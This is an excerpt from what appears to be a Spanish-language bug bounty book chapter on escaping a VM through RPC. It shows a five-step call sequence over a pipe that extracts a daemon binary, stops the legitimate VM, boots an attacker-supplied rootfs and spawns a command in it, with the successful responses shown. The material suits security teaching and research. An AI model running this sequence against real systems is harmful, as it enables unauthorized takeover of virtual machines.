// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
// Paso 1: Extraer sdk-daemon (8 MB, ELF 64-bit)
send_rpc(pipe, "readFile",
    "\"path\":\"/usr/local/bin/sdk-daemon\"");
// Respuesta: 11,032,199 bytes en base64

// Paso 2: Detener VM legítima
send_rpc(pipe, "stopVM", "");

// Paso 3: Bootear con nuestro rootfs
send_rpc(pipe, "startVM",
    "\"bundlePath\":\"C:\\\\Users\\\\attacker\\\\custom_vm\"");
// {"success":true}

// Paso 4: Verificar que nuestra VM está corriendo
send_rpc(pipe, "isGuestConnected", "");
// {"connected":true}

// Paso 5: Ejecutar en nuestra VM
send_rpc(pipe, "spawn", "\"cmd\":\"cat /etc/os-release\"");
